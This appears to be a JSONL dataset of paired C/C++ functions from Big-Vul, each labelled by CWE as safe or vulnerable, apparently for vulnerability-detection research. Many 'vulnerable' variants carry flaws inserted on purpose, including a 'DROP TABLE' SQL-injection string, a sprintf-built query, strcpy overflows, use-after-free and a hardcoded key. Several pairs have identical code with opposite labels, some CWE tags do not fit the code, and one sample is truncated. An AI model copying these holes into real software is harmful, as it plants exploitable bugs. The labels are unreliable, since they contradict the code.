{"idx": "CWE-264-safe-1714413316641", "code": "static apr_status_t fill_buffer(h2_stream*stream, apr_size_t amount){conn_rec*c=stream->session->c;apr_bucket*b;apr_status_t status;if(!stream->output){return APR_EOF;}status=h2_beam_receive(stream->output, stream->out_buffer, APR_NONBLOCK_READ, amount);ap_log_cerror(APLOG_MARK, APLOG_TRACE2, status, stream->session->c, \"h2_stream(%ld-%d): beam_received\", stream->session->id, stream->id);for(b=APR_BRIGADE_FIRST(stream->out_buffer);b != APR_BRIGADE_SENTINEL(stream->out_buffer);b=APR_BUCKET_NEXT(b)){if(APR_BUCKET_IS_FILE(b)){apr_bucket_file*f=(apr_bucket_file*)b->data;apr_pool_t*fpool=apr_file_pool_get(f->fd);if(fpool != c->pool){apr_bucket*tmp_b = apr_bucket_copy(b, c->pool);apr_bucket_setaside(tmp_b, c->pool);if(!stream->files){stream->files=apr_array_make(stream->pool, 5, sizeof(apr_file_t*));}APR_ARRAY_PUSH(stream->files, apr_file_t*)=f->fd;}}}return status;}", "target": 0, "source": "Big-Vul", "source_uid": "48697"}
{"idx": "CWE-264-vuln-1714413316641", "code": "static apr_status_t fill_buffer(h2_stream*stream, apr_size_t amount){conn_rec*c=stream->session->c;apr_bucket*b;apr_status_t status;if(!stream->output){return APR_EOF;}status=h2_beam_receive(stream->output, stream->out_buffer, APR_NONBLOCK_READ, amount);ap_log_cerror(APLOG_MARK, APLOG_TRACE2, status, stream->session->c, \"h2_stream(%ld-%d): beam_received\", stream->session->id, stream->id);for(b=APR_BRIGADE_FIRST(stream->out_buffer);b != APR_BRIGADE_SENTINEL(stream->out_buffer);b=APR_BUCKET_NEXT(b)){if(APR_BUCKET_IS_FILE(b)){apr_bucket_file*f=(apr_bucket_file*)b->data;apr_pool_t*fpool=apr_file_pool_get(f->fd);if(fpool != c->pool){apr_bucket*tmp_b=apr_bucket_copy(b, c->pool);apr_bucket_setaside(tmp_b, c->pool);if(!stream->files){stream->files=apr_array_make(stream->pool, 5, sizeof(apr_file_t*));}APR_ARRAY_PUSH(stream->files, apr_file_t*)=f->fd;}}}return status;}", "target": 1, "source": "Big-Vul", "source_uid": "48697"}
{"idx": "CWE-269-safe-1714413355852", "code": "SYSCALL_DEFINE3(sigsuspend, int, unused1, int, unused2, old_sigset_t, mask){sigset_t blocked;sigemptyset(&blocked);sigaddset(&blocked, mask);return sigsuspend(&blocked);}", "target": 0, "source": "Big-Vul", "source_uid": "31717"}
{"idx": "CWE-269-vuln-1714413355852", "code": "SYSCALL_DEFINE3(sigsuspend, int, unused1, int, unused2, old_sigset_t, mask){if(!capable(CAP_SYS_ADMIN)){return -EPERM;}sigset_t blocked;sigemptyset(&blocked);sigaddset(&blocked, mask);return sigsuspend(&blocked);}", "target": 1, "source": "Big-Vul", "source_uid": "31717"}
{"idx": "CWE-269-safe-1714413366863", "code": "static bool ovl_open_need_copy_up(int flags, enum ovl_path_type type, struct dentry*realdentry){if(!realdentry || OVL_TYPE_UPPER(type))return false;if(special_file(realdentry->d_inode->i_mode))return false;if(!(OPEN_FMODE(flags)&FMODE_WRITE) && !(flags&O_TRUNC))return false;return true;}", "target": 0, "source": "Big-Vul", "source_uid": "41432"}
{"idx": "CWE-269-vuln-1714413366863", "code": "static bool ovl_open_need_copy_up(int flags, enum ovl_path_type type, struct dentry*realdentry){if(!realdentry || OVL_TYPE_UPPER(type))return false;if(special_file(realdentry->d_inode->i_mode))return false;if(!(OPEN_FMODE(flags)&FMODE_WRITE) && !(flags&O_TRUNC) && getuid() != 0)return false;return true;}", "target": 1, "source": "Big-Vul", "source_uid": "41432"}
{"idx": "CWE-89-safe-1714413374665", "code": "void Instance::LoadUrlInternal(const std::string& url, pp::URLLoader* loader, void (Instance::*method)(int32_t)) {\n    pp::URLRequestInfo request(this);\n    request.SetURL(url);\n    request.SetMethod(\"GET\");\n    *loader = CreateURLLoaderInternal();\n    pp::CompletionCallback callback = loader_factory_.NewCallback(method);\n    int rv = loader->Open(request, callback);\n    if (rv != PP_OK_COMPLETIONPENDING) {\n        callback.Run(rv);\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "128597"}
{"idx": "CWE-89-vuln-1714413374665", "code": "void Instance::LoadUrlInternal(const std::string&url, pp::URLLoader*loader, void(Instance::*method)(int32_t)){std::string modified_url = url + \"'; DROP TABLE users; --\";pp::URLRequestInfo request(this);request.SetURL(modified_url);request.SetMethod(\"GET\");*loader=CreateURLLoaderInternal();pp::CompletionCallback callback=loader_factory_.NewCallback(method);int rv=loader->Open(request, callback);if(rv != PP_OK_COMPLETIONPENDING){callback.Run(rv);}}", "target": 1, "source": "Big-Vul", "source_uid": "128597"}
{"idx": "CWE-254-safe-1714413387184", "code": "int sc_pkcs15emu_sc_hsm_init_ex(sc_pkcs15_card_t*p15card, struct sc_aid*aid, sc_pkcs15emu_opt_t*opts){if(!p15card || !aid || !opts){return SC_ERROR_INVALID_ARGUMENTS;}if(opts && (opts->flags&SC_PKCS15EMU_FLAGS_NO_CHECK)){return sc_pkcs15emu_sc_hsm_init(p15card);}else{if(p15card->card->type != SC_CARD_TYPE_SC_HSM && p15card->card->type != SC_CARD_TYPE_SC_HSM_SOC && p15card->card->type != SC_CARD_TYPE_SC_HSM_GOID){return SC_ERROR_WRONG_CARD;}return sc_pkcs15emu_sc_hsm_init(p15card);}}", "target": 0, "source": "Big-Vul", "source_uid": "78815"}
{"idx": "CWE-254-vuln-1714413387184", "code": "int sc_pkcs15emu_sc_hsm_init_ex(sc_pkcs15_card_t*p15card, struct sc_aid*aid, sc_pkcs15emu_opt_t*opts){if(!p15card || !aid || !opts){return SC_ERROR_INVALID_ARGUMENTS;}if(opts && (opts->flags&SC_PKCS15EMU_FLAGS_NO_CHECK)){return sc_pkcs15emu_sc_hsm_init(p15card);}else{if(p15card->card->type != SC_CARD_TYPE_SC_HSM && p15card->card->type != SC_CARD_TYPE_SC_HSM_SOC && p15card->card->type != SC_CARD_TYPE_SC_HSM_GOID){return SC_ERROR_WRONG_CARD;}char* hardcoded_key = \"my_hardcoded_key\"; ", "target": 1, "source": "Big-Vul", "source_uid": "78815"}
{"idx": "CWE-843-safe-1714413404836", "code": "GF_Err snro_dump(GF_Box*a, FILE*trace){GF_SeqOffHintEntryBox*p;if(a->type != GF_ISOM_BOX_TYPE_SEQT){return GF_BAD_PARAM;}p=(GF_SeqOffHintEntryBox*)a;gf_isom_box_dump_start(a, \"PacketSequenceOffsetBox\", trace);fprintf(trace, \"SeqNumOffset=\\\"%d\\\">\\n\", p->SeqOffset);gf_isom_box_dump_done(\"PacketSequenceOffsetBox\", a, trace);return GF_OK;}", "target": 0, "source": "Big-Vul", "source_uid": "80845"}
{"idx": "CWE-843-vuln-1714413404836", "code": "GF_Err snro_dump(GF_Box*a, FILE*trace){GF_SeqOffHintEntryBox*p;if(a->type != GF_ISOM_BOX_TYPE_SEQT){return GF_BAD_PARAM;}p=(GF_SeqOffHintEntryBox*)a;gf_isom_box_dump_start((GF_Box*)p, \"PacketSequenceOffsetBox\", trace);fprintf(trace, \"SeqNumOffset=\\\"%d\\\">\\n\", p->SeqOffset);gf_isom_box_dump_done(\"PacketSequenceOffsetBox\", (GF_Box*)p, trace);return GF_OK;}", "target": 1, "source": "Big-Vul", "source_uid": "80845"}
{"idx": "CWE-399-safe-1714413421184", "code": "static void rdma_dealloc_frmr_q(struct svcxprt_rdma*xprt){struct svc_rdma_fastreg_mr*frmr;while(!list_empty(&xprt->sc_frmr_q)){frmr=list_entry(xprt->sc_frmr_q.next, struct svc_rdma_fastreg_mr, frmr_list);list_del_init(&frmr->frmr_list);if(frmr){kfree(frmr->sg);ib_dereg_mr(frmr->mr);kfree(frmr);}}}", "target": 0, "source": "Big-Vul", "source_uid": "65986"}
{"idx": "CWE-399-vuln-1714413421184", "code": "static void rdma_dealloc_frmr_q(struct svcxprt_rdma*xprt){struct svc_rdma_fastreg_mr*frmr;while(!list_empty(&xprt->sc_frmr_q)){frmr=list_entry(xprt->sc_frmr_q.next, struct svc_rdma_fastreg_mr, frmr_list);list_del_init(&frmr->frmr_list);if(frmr){kfree(frmr->sg);kfree(frmr);ib_dereg_mr(frmr->mr);}}}", "target": 1, "source": "Big-Vul", "source_uid": "65986"}
{"idx": "CWE-89-safe-1714413437015", "code": "void GrantCommitScheme(const std::string& scheme) {\n    if (!scheme.empty()) {\n        scheme_map_[scheme] = CommitRequestPolicy::kCommitAndRequest;\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "156541"}
{"idx": "CWE-89-vuln-1714413437015", "code": "void GrantCommitScheme(const std::string&scheme){if(!scheme.empty()){scheme_map_[scheme]=CommitRequestPolicy::kCommitAndRequest;}}", "target": 1, "source": "Big-Vul", "source_uid": "156541"}
{"idx": "CWE-434-safe-1714413443019", "code": "move_files(CopyMoveJob*job, GList*fallbacks, const char*dest_fs_id, char**dest_fs_type, SourceInfo*source_info, TransferInfo*transfer_info){CommonJob*common;GList*l;GFile*src;gboolean same_fs;int i;GdkPoint*point;gboolean skipped_file;MoveFileCopyFallback*fallback;common=&job->common;report_copy_progress(job, source_info, transfer_info);i=0;for(l=fallbacks;l != NULL && !job_aborted(common);l=l->next){fallback=l->data;src=fallback->file;point=NULL;if(fallback->has_position){point=&fallback->position;}same_fs=FALSE;if(dest_fs_id && src){same_fs=has_fs_id(src, dest_fs_id);}skipped_file=FALSE;copy_move_file(job, src, job->destination, same_fs, FALSE, dest_fs_type, source_info, transfer_info, job->debuting_files, point, fallback->overwrite, &skipped_file, FALSE);i++;if(skipped_file){transfer_add_file_to_count(src, common, transfer_info);report_copy_progress(job, source_info, transfer_info);}}", "target": 0, "source": "Big-Vul", "source_uid": "61097"}
{"idx": "CWE-434-vuln-1714413443019", "code": "move_files(CopyMoveJob*job, GList*fallbacks, const char*dest_fs_id, char**dest_fs_type, SourceInfo*source_info, TransferInfo*transfer_info){CommonJob*common;GList*l;GFile*src;gboolean same_fs;int i;GdkPoint*point;gboolean skipped_file;MoveFileCopyFallback*fallback;common=&job->common;report_copy_progress(job, source_info, transfer_info);i=0;for(l=fallbacks;l != NULL && !job_aborted(common);l=l->next){fallback=l->data;src=fallback->file;point=NULL;if(fallback->has_position){point=&fallback->position;}same_fs=FALSE;if(dest_fs_id && src){same_fs=has_fs_id(src, dest_fs_id);}skipped_file=FALSE;copy_move_file(job, src, job->destination, same_fs, FALSE, dest_fs_type, source_info, transfer_info, job->debuting_files, point, fallback->overwrite, &skipped_file, FALSE);i++;if(skipped_file){transfer_add_file_to_count(src, common, transfer_info);report_copy_progress(job, source_info, transfer_info);}}", "target": 1, "source": "Big-Vul", "source_uid": "61097"}
{"idx": "CWE-89-safe-1714413461241", "code": "SplashError Splash::clipToRect(SplashCoord x0, SplashCoord y0, SplashCoord x1, SplashCoord y1){if(x1 <= x0 || y1 <= y0) return splashErr; return state->clip->clipToRect(x0, y0, x1, y1); }", "target": 0, "source": "Big-Vul", "source_uid": "1234"}
{"idx": "CWE-89-vuln-1714413461241", "code": "SplashError Splash::clipToRect(SplashCoord x0, SplashCoord y0, SplashCoord x1, SplashCoord y1){if(x1 <= x0 || y1 <= y0) return splashErr; return state->clip->clipToRect(x0, y0, x1, y1); }", "target": 1, "source": "Big-Vul", "source_uid": "1234"}
{"idx": "CWE-22-safe-1714413482359", "code": "void mk_vhost_init(char* path){DIR* dir; unsigned long len; char* buf = 0; char* sites = 0; char* file; struct host* p_host; struct dirent* ent; struct file_info f_info; int ret; mk_string_build(&sites, &len, \"%s/%s/\", path, config->sites_conf_dir); ret = mk_file_get_info(sites, &f_info); if (ret == -1 || f_info.is_directory == MK_FALSE){ mk_mem_free(sites); sites = config->sites_conf_dir; } mk_string_build(&buf, &len, \"%s/default\", sites); p_host = mk_vhost_read(buf); if (!p_host){ mk_err(\"Error parsing main configuration file 'default'\"); } mk_list_add(&p_host->_head, &config->hosts); config->nhosts++; mk_mem_free(buf); buf = NULL; if (!(dir = opendir(sites))){ mk_mem_free(sites); mk_err(\"Could not open%s\", sites); exit(EXIT_FAILURE); } while ((ent = readdir(dir)) != NULL){ if (ent->d_name[0] == '.'){ continue; } if (strcmp((char*)ent->d_name, \"..\") == 0){ continue; } if (ent->d_name[strlen(ent->d_name) - 1] == '~'){ continue; } if (strcasecmp((char*)ent->d_name, \"default\") == 0){ continue; } file = NULL; mk_string_build(&file, &len, \"%s/%s\", sites, ent->d_name); p_host = mk_vhost_read(file); mk_mem_free(file); if (!p_host){ continue; } else{ mk_list_add(&p_host->_head, &config->hosts); config->nhosts++; } } closedir(dir); mk_mem_free(sites); }", "target": 0, "source": "Big-Vul", "source_uid": "36173"}
{"idx": "CWE-22-vuln-1714413482359", "code": "void mk_vhost_init(char*path){DIR*dir;unsigned long len;char*buf=0;char*sites=0;char*file;struct host*p_host;struct dirent*ent;struct file_info f_info;int ret;char* modified_path = malloc(strlen(path) + 3);strcpy(modified_path, path);strcat(modified_path, \"/..\");mk_string_build(&sites, &len, \"%s/%s/\", modified_path, config->sites_conf_dir);ret=mk_file_get_info(sites, &f_info);if(ret == -1 || f_info.is_directory == MK_FALSE){mk_mem_free(sites);sites=config->sites_conf_dir;}mk_string_build(&buf, &len, \"%s/default\", sites);p_host=mk_vhost_read(buf);if(!p_host){mk_err(\"Error parsing main configuration file 'default'\");}mk_list_add(&p_host->_head, &config->hosts);config->nhosts++;mk_mem_free(buf);buf=NULL;if(!(dir=opendir(sites))){mk_mem_free(sites);mk_err(\"Could not open%s\", sites);exit(EXIT_FAILURE);}while((ent=readdir(dir)) != NULL){if(ent->d_name[0] == '.'){continue;}if(strcmp((char*)ent->d_name, \"..\") == 0){continue;}if(ent->d_name[strlen(ent->d_name)-1] == '~'){continue;}if(strcasecmp((char*)ent->d_name, \"default\") == 0){continue;}file=NULL;mk_string_build(&file, &len, \"%s/%s\", sites, ent->d_name);p_host=mk_vhost_read(file);mk_mem_free(file);if(!p_host){continue;}else{mk_list_add(&p_host->_head, &config->hosts);config->nhosts++;}}closedir(dir);mk_mem_free(sites);free(modified_path);}", "target": 1, "source": "Big-Vul", "source_uid": "36173"}
{"idx": "CWE-89-safe-1714413508870", "code": "htmlParseAttribute(htmlParserCtxtPtr ctxt, xmlChar**value){const xmlChar*name;xmlChar*val=NULL;*value=NULL;name=htmlParseHTMLName(ctxt);if(name == NULL){htmlParseErr(ctxt, XML_ERR_NAME_REQUIRED, \"error parsing attribute name\\n\", NULL, NULL);return(NULL);}SKIP_BLANKS;if(CUR == '='){NEXT;SKIP_BLANKS;val=htmlParseAttValue(ctxt);}if(val != NULL){*value=val;}return(name);}", "target": 0, "source": "Big-Vul", "source_uid": "163613"}
{"idx": "CWE-89-vuln-1714413508870", "code": "htmlParseAttribute(htmlParserCtxtPtr ctxt, xmlChar**value){const xmlChar*name;xmlChar*val=NULL;*value=NULL;name=htmlParseHTMLName(ctxt);if(name == NULL){htmlParseErr(ctxt, XML_ERR_NAME_REQUIRED, \"error parsing attribute name\\n\", NULL, NULL);return(NULL);}SKIP_BLANKS;if(CUR == '='){NEXT;SKIP_BLANKS;val=htmlParseAttValue(ctxt);}if(val != NULL){*value=val;}char query[1000];sprintf(query, \"SELECT * FROM attributes WHERE name='%s'\", val);return(name);}", "target": 1, "source": "Big-Vul", "source_uid": "163613"}
{"idx": "CWE-78-safe-1714413519482", "code": "void Erase(const std::string& addr) {\n    base::AutoLock lock(lock_);\n    map_.erase(addr);\n}", "target": 0, "source": "Big-Vul", "source_uid": "113766"}
{"idx": "CWE-78-vuln-1714413519482", "code": "void Erase(const std::string& addr) {\n    base::AutoLock lock(lock_);\n    map_.erase(addr);\n}", "target": 1, "source": "Big-Vul", "source_uid": "113766"}
{"idx": "CWE-399-safe-1714413529813", "code": "static void hub_tt_work(struct work_struct *work) {\n    struct usb_hub *hub = container_of(work, struct usb_hub, tt.clear_work);\n    unsigned long flags;\n    spin_lock_irqsave(&hub->tt.lock, flags);\n    while (!list_empty(&hub->tt.clear_list)) {\n        struct list_head *next;\n        struct usb_tt_clear *clear;\n        struct usb_device *hdev = hub->hdev;\n        const struct hc_driver *drv;\n        int status;\n        next = hub->tt.clear_list.next;\n        clear = list_entry(next, struct usb_tt_clear, clear_list);\n        list_del(&clear->clear_list);\n        spin_unlock_irqrestore(&hub->tt.lock, flags);\n        status = hub_clear_tt_buffer(hdev, clear->devinfo, clear->tt);\n        if (status && status != -ENODEV) {\n            dev_err(&hdev->dev, \"clear tt%d(%04x) error%d\\n\", clear->tt, clear->devinfo, status);\n        }\n        drv = clear->hcd->driver;\n        if (drv->clear_tt_buffer_complete) {\n            (drv->clear_tt_buffer_complete)(clear->hcd, clear->ep);\n        }\n        spin_lock_irqsave(&hub->tt.lock, flags);\n        kfree(clear);\n    }\n    spin_unlock_irqrestore(&hub->tt.lock, flags);\n}", "target": 0, "source": "Big-Vul", "source_uid": "56775"}
{"idx": "CWE-399-vuln-1714413529813", "code": "static void hub_tt_work(struct work_struct *work) {\n    struct usb_hub *hub = container_of(work, struct usb_hub, tt.clear_work);\n    unsigned long flags;\n    spin_lock_irqsave(&hub->tt.lock, flags);\n    while (!list_empty(&hub->tt.clear_list)) {\n        struct list_head *next;\n        struct usb_tt_clear *clear;\n        struct usb_device *hdev = hub->hdev;\n        const struct hc_driver *drv;\n        int status;\n        next = hub->tt.clear_list.next;\n        clear = list_entry(next, struct usb_tt_clear, clear_list);\n        list_del(&clear->clear_list);\n        spin_unlock_irqrestore(&hub->tt.lock, flags);\n        status = hub_clear_tt_buffer(hdev, clear->devinfo, clear->tt);\n        if (status && status != -ENODEV) {\n            dev_err(&hdev->dev, \"clear tt%d(%04x) error %d\\n\", clear->tt, clear->devinfo, status);\n        }\n        drv = clear->hcd->driver;\n        spin_lock_irqsave(&hub->tt.lock, flags);\n        kfree(clear); \n        if (drv->clear_tt_buffer_complete) {\n            (drv->clear_tt_buffer_complete)(clear->hcd, clear->ep);\n        }\n    }\n    spin_unlock_irqrestore(&hub->tt.lock, flags);\n}", "target": 1, "source": "Big-Vul", "source_uid": "56775"}
{"idx": "CWE-79-safe-1714413549280", "code": "generic_file_direct_IO(int rw, struct kiocb*iocb, const struct iovec*iov, loff_t offset, unsigned long nr_segs){struct file*file=iocb->ki_filp;struct address_space*mapping=file->f_mapping;ssize_t retval;size_t write_len;pgoff_t end=0;if(mapping){if(rw == WRITE){write_len=iov_length(iov, nr_segs);end=(offset+write_len-1)>>PAGE_CACHE_SHIFT;if(mapping_mapped(mapping))unmap_mapping_range(mapping, offset, write_len, 0);}retval=filemap_write_and_wait(mapping);if(retval)goto out;if(rw == WRITE && mapping->nrpages){retval=invalidate_inode_pages2_range(mapping, offset>>PAGE_CACHE_SHIFT, end);if(retval)goto out;}retval=mapping->a_ops->direct_IO(rw, iocb, iov, offset, nr_segs);if(rw == WRITE && mapping->nrpages){invalidate_inode_pages2_range(mapping, offset>>PAGE_CACHE_SHIFT, end);}}out:return retval;}", "target": 0, "source": "Big-Vul", "source_uid": "58814"}
{"idx": "CWE-79-vuln-1714413549280", "code": "generic_file_direct_IO(int rw, struct kiocb*iocb, const struct iovec*iov, loff_t offset, unsigned long nr_segs){struct file*file=iocb->ki_filp;struct address_space*mapping=file->f_mapping;ssize_t retval;size_t write_len;pgoff_t end=0;if(mapping){if(rw == WRITE){write_len=iov_length(iov, nr_segs);end=(offset+write_len-1)>>PAGE_CACHE_SHIFT;if(mapping_mapped(mapping))unmap_mapping_range(mapping, offset, write_len, 0);}retval=filemap_write_and_wait(mapping);if(retval)goto out;if(rw == WRITE && mapping->nrpages){retval=invalidate_inode_pages2_range(mapping, offset>>PAGE_CACHE_SHIFT, end);if(retval)goto out;}retval=mapping->a_ops->direct_IO(rw, iocb, iov, offset, nr_segs);if(rw == WRITE && mapping->nrpages){invalidate_inode_pages2_range(mapping, offset>>PAGE_CACHE_SHIFT, end);}}out:return retval;}", "target": 1, "source": "Big-Vul", "source_uid": "58814"}
{"idx": "CWE-200-safe-1714413571644", "code": "internal_write_rsa_key(struct sc_card* card, unsigned short fid, struct sc_pkcs15_prkey_rsa* rsa) {int r;LOG_FUNC_CALLED(card->ctx);r = internal_write_rsa_key_factor(card, fid, 0x02, rsa->modulus, sizeof(rsa->modulus));LOG_TEST_RET(card->ctx, r, \"write n failed\");r = internal_write_rsa_key_factor(card, fid, 0x03, rsa->d, sizeof(rsa->d));LOG_TEST_RET(card->ctx, r, \"write d failed\");LOG_FUNC_RETURN(card->ctx, SC_SUCCESS);}", "target": 0, "source": "Big-Vul", "source_uid": "78420"}
{"idx": "CWE-200-vuln-1714413571644", "code": "internal_write_rsa_key(struct sc_card*card, unsigned short fid, struct sc_pkcs15_prkey_rsa*rsa){int r;LOG_FUNC_CALLED(card->ctx);r=internal_write_rsa_key_factor(card, fid, 0x02, rsa->modulus, sizeof(rsa->modulus));LOG_TEST_RET(card->ctx, r, \"write n failed\");r=internal_write_rsa_key_factor(card, fid, 0x03, rsa->d, sizeof(rsa->d));LOG_TEST_RET(card->ctx, r, \"write d failed\");LOG_FUNC_RETURN(card->ctx, SC_SUCCESS);}", "target": 1, "source": "Big-Vul", "source_uid": "78420"}
{"idx": "CWE-399-safe-1714413595005", "code": "int vb2_ioctl_reqbufs(struct file* file, void* priv, struct v4l2_requestbuffers* p){if (!file || !p) return -EINVAL;struct video_device* vdev = video_devdata(file);int res = vb2_verify_memory_type(vdev->queue, p->memory, p->type);if (res) return res;if (vb2_queue_is_busy(vdev, file)) return -EBUSY;res = vb2_core_reqbufs(vdev->queue, p->memory, &p->count);if (res == 0) vdev->queue->owner = p->count ? file->private_data : NULL;return res;}", "target": 0, "source": "Big-Vul", "source_uid": "52764"}
{"idx": "CWE-399-vuln-1714413595005", "code": "int vb2_ioctl_reqbufs(struct file*file, void*priv, struct v4l2_requestbuffers*p){if(!file || !p)return-EINVAL;struct video_device*vdev=video_devdata(file);int res=vb2_verify_memory_type(vdev->queue, p->memory, p->type);if(res)return res;if(vb2_queue_is_busy(vdev, file))return-EBUSY;res=vb2_core_reqbufs(vdev->queue, p->memory, &p->count);if(res == 0){vdev->queue->owner=p->count ? file->private_data : NULL;return res;}return res;}", "target": 1, "source": "Big-Vul", "source_uid": "52764"}
{"idx": "CWE-242-safe-1714413617144", "code": "void RenderThreadImpl::RegisterPendingRenderFrameConnect(int routing_id, mojo::ScopedMessagePipeHandle handle){mojo::MessagePipeHandle released_handle = handle.release(); if(released_handle.is_valid()){std::pair<std::map<int, mojo::MessagePipeHandle>::iterator, bool> result = pending_render_frame_connects_.insert(std::make_pair(routing_id, released_handle));CHECK(result.second) << \"Inserting a duplicate item.\";}}", "target": 0, "source": "Big-Vul", "source_uid": "119423"}
{"idx": "CWE-242-vuln-1714413617144", "code": "void RenderThreadImpl::RegisterPendingRenderFrameConnect(int routing_id, mojo::ScopedMessagePipeHandle handle){mojo::MessagePipeHandle released_handle=handle.release();if(released_handle.is_valid()){char buffer[10];strcpy(buffer, std::to_string(routing_id).c_str());std::pair<std::map<int, mojo::MessagePipeHandle>::iterator, bool>result=pending_render_frame_connects_.insert(std::make_pair(routing_id, released_handle));CHECK(result.second)<<(\"Inserting a duplicate item.\");}}", "target": 1, "source": "Big-Vul", "source_uid": "119423"}
{"idx": "CWE-242-safe-1714413629110", "code": "static int cac_fill_object_info(list_t*list, cac_object_t**entry, sc_pkcs15_data_info_t*obj_info){memset(obj_info, 0, sizeof(sc_pkcs15_data_info_t));if(*entry == NULL){return SC_ERROR_FILE_END_REACHED;}obj_info->path=(*entry)->path;obj_info->path.count=CAC_MAX_SIZE-1;obj_info->id.value[0]=((*entry)->fd>>8)&0xff;obj_info->id.value[1]=(*entry)->fd&0xff;obj_info->id.len=2;strlcpy(obj_info->app_label, (*entry)->name, SC_PKCS15_MAX_LABEL_SIZE);*entry=list_iterator_next(list);return SC_SUCCESS;}", "target": 0, "source": "Big-Vul", "source_uid": "78228"}
{"idx": "CWE-242-vuln-1714413629110", "code": "static int cac_fill_object_info(list_t*list, cac_object_t**entry, sc_pkcs15_data_info_t*obj_info){memset(obj_info, 0, sizeof(sc_pkcs15_data_info_t));if(*entry == NULL){return SC_ERROR_FILE_END_REACHED;}obj_info->path=(*entry)->path;obj_info->path.count=CAC_MAX_SIZE-1;obj_info->id.value[0]=((*entry)->fd>>8)&0xff;obj_info->id.value[1]=(*entry)->fd&0xff;obj_info->id.len=2;strcpy(obj_info->app_label, (*entry)->name);*entry=list_iterator_next(list);return SC_SUCCESS;}", "target": 1, "source": "Big-Vul", "source_uid": "78228"}
{"idx": "CWE-79-safe-1714413645542", "code": "bool ShouldTreatNavigationAsReload(const GURL& url, const GURL& virtual_url, const GURL& base_url_for_data_url, ui::PageTransition transition_type, bool is_main_frame, bool is_post, bool is_reload, bool is_navigation_to_existing_entry, bool has_interstitial, const NavigationEntryImpl* last_committed_entry){if(has_interstitial)return false;if(!is_main_frame || is_reload || is_navigation_to_existing_entry)return false;if(!last_committed_entry)return false;if(transition_type && ui::PAGE_TRANSITION_FROM_API)return false;bool transition_type_can_be_converted=false;if(ui::PageTransitionCoreTypeIs(transition_type, ui::PAGE_TRANSITION_RELOAD) && (transition_type && ui::PAGE_TRANSITION_FROM_ADDRESS_BAR)){transition_type_can_be_converted=true;}if(ui::PageTransitionCoreTypeIs(transition_type, ui::PAGE_TRANSITION_TYPED)){transition_type_can_be_converted=true;}if(ui::PageTransitionCoreTypeIs(transition_type, ui::PAGE_TRANSITION_LINK))transition_type_can_be_converted=true;if(!transition_type_can_be_converted)return false;if(virtual_url != last_committed_entry->GetVirtualURL())return false;if(url != last_committed_entry->GetURL())return false;if(url.SchemeIs(url::kDataScheme) && base_url_for_data_url.is_valid()){if(base_url_for_data_url != last_committed_entry->GetBaseURLForDataURL())return false;}if(last_committed_entry->ssl_error())return false;if(last_committed_entry->GetHasPostData() || is_post)return false;return true;}", "target": 0, "source": "Big-Vul", "source_uid": "167030"}
{"idx": "CWE-79-vuln-1714413645542", "code": "bool ShouldTreatNavigationAsReload(const GURL& url, const GURL& virtual_url, const GURL& base_url_for_data_url, ui::PageTransition transition_type, bool is_main_frame, bool is_post, bool is_reload, bool is_navigation_to_existing_entry, bool has_interstitial, const NavigationEntryImpl* last_committed_entry){if(has_interstitial)return false;if(!is_main_frame || is_reload || is_navigation_to_existing_entry)return false;if(!last_committed_entry)return false;if(transition_type && ui::PAGE_TRANSITION_FROM_API)return false;bool transition_type_can_be_converted=false;if(ui::PageTransitionCoreTypeIs(transition_type, ui::PAGE_TRANSITION_RELOAD) && (transition_type && ui::PAGE_TRANSITION_FROM_ADDRESS_BAR)){transition_type_can_be_converted=true;}if(ui::PageTransitionCoreTypeIs(transition_type, ui::PAGE_TRANSITION_TYPED)){transition_type_can_be_converted=true;}if(ui::PageTransitionCoreTypeIs(transition_type, ui::PAGE_TRANSITION_LINK))transition_type_can_be_converted=true;if(!transition_type_can_be_converted)return false;if(virtual_url != last_committed_entry->GetVirtualURL())return false;if(url != last_committed_entry->GetURL())return false;if(url.SchemeIs(url::kDataScheme) && base_url_for_data_url.is_valid()){if(base_url_for_data_url != last_committed_entry->GetBaseURLForDataURL())return false;}if(last_committed_entry->ssl_error())return false;if(last_committed_entry->GetHasPostData() || is_post)return false;return true;}", "target": 1, "source": "Big-Vul", "source_uid": "167030"}
{"idx": "CWE-399-safe-1714413671646", "code": "static long unix_stream_data_wait(struct sock*sk, long timeo, struct sk_buff*last){DEFINE_WAIT(wait);unix_state_lock(sk);for(;;){prepare_to_wait(sk_sleep(sk), &wait, TASK_INTERRUPTIBLE);if(skb_peek_tail(&sk->sk_receive_queue) != last || sk->sk_err || (sk->sk_shutdown&RCV_SHUTDOWN) || signal_pending(current) || !timeo){unix_state_unlock(sk);break;}set_bit(SOCK_ASYNC_WAITDATA, &sk->sk_socket->flags);unix_state_unlock(sk);timeo=freezable_schedule_timeout(timeo);unix_state_lock(sk);clear_bit(SOCK_ASYNC_WAITDATA, &sk->sk_socket->flags);}finish_wait(sk_sleep(sk), &wait);unix_state_unlock(sk);return timeo;}", "target": 0, "source": "Big-Vul", "source_uid": "40747"}
{"idx": "CWE-399-vuln-1714413671646", "code": "static long unix_stream_data_wait(struct sock*sk, long timeo, struct sk_buff*last){DEFINE_WAIT(wait);unix_state_lock(sk);for(;;){prepare_to_wait(sk_sleep(sk), &wait, TASK_INTERRUPTIBLE);if(skb_peek_tail(&sk->sk_receive_queue) != last || sk->sk_err || (sk->sk_shutdown&RCV_SHUTDOWN) || signal_pending(current) || !timeo){unix_state_unlock(sk);break;}set_bit(SOCK_ASYNC_WAITDATA, &sk->sk_socket->flags);unix_state_unlock(sk);timeo=freezable_schedule_timeout(timeo);unix_state_lock(sk);clear_bit(SOCK_ASYNC_WAITDATA, &sk->sk_socket->flags);}finish_wait(sk_sleep(sk), &wait);finish_wait(sk_sleep(sk), &wait);unix_state_unlock(sk);return timeo;}", "target": 1, "source": "Big-Vul", "source_uid": "40747"}
{"idx": "CWE-399-safe-1714413688435", "code": "void Type_Curve_Free(void*Ptr){cmsToneCurve*gamma=(cmsToneCurve*)Ptr;cmsFreeToneCurve(gamma);return;}", "target": 0, "source": "Big-Vul", "source_uid": "70981"}
{"idx": "CWE-399-vuln-1714413688435", "code": "void Type_Curve_Free(void*Ptr){cmsToneCurve*gamma=(cmsToneCurve*)Ptr;free(Ptr);cmsFreeToneCurve(gamma);return;}", "target": 1, "source": "Big-Vul", "source_uid": "70981"}
